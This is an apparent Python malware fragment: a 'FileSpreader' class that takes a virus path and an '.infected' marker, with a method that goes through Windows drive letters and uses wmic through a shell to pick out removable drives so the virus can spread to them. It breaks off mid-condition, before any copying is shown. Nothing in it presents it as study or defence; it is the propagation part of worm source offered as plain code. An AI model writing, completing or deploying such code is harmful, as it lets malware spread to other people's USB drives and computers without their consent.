import os
import shutil
import platform
import socket
import subprocess
from pathlib import Path

class FileSpreader:
    def __init__(self, virus_path):
        self.virus_path = virus_path
        self.infected_marker = ".infected"
    
    def spread_to_removable_drives(self):
        try:
            if platform.system() == "Windows":
                # Get all removable drives
                drives = []
                for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                    if os.path.exists(f"{drive}:\\"):
                        drive_type = subprocess.check_output(
                            f"wmic logicaldisk where \"DeviceID='{drive}:'\" get DriveType", 
                            shell=True, text=True
                        ).strip().split('\n')[-1]
                        
                        if drive_type == "2": 
